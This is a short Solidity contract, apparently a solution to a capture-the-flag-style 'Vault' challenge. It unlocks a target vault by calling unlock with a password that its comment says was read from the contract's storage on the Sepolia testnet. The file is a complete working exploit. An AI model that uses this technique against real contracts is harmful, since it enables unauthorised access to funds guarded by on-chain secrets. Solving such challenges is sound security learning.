pragma solidity ^0.8.0;

import './IVault.sol';

contract VaultAttacker {
    // Found in sepolia scan
    uint256 password = 29457691405064188121368146564401373537695763716936415088691546795584102873641;

    function attackVault (address _vault) public {
        IVault(_vault).unlock(bytes32(password));
    }
}